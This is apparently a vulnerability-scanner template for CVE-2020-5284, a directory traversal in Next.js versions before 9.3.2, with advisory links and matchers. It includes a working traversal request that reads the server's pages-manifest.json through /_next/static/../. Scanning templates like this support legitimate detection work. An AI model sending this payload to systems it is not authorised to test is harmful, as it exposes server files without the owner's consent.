id: cve-2020-5284
info:
  name: Next.js Directory Traversal
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Next.js versions before 9.3.2 have a directory traversal vulnerability. Attackers could craft special requests to access files in the dist directory (.next). This does not affect files outside of the dist directory (.next). In general, the dist directory only holds build assets unless your application intentionally stores other assets under this directory. This issue is fixed in version 9.3.2.
  tags: directory-traversal
  reference:
    - https://github.com/zeit/next.js/releases/tag/v9.3.2
    - https://github.com/zeit/next.js/security/advisories/GHSA-fq77-7p7r-83rj
    - https://nvd.nist.gov/vuln/detail/CVE-2020-5284
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5284

http:
  - raw:
      - |
        GET /_next/static/../server/pages-manifest.json HTTP/1.1
        Host: {{Hostname}}

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/json"
      - type: regex
        part: body
        regex:
          - "/_app\": \".*?_app\\.js"
